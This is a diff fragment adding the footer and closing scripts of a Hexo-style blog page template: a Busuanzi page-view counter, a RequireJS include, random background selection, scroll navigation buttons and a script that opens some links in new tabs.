+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style="display:none">
+                        <span id="page-visit" title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 3;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
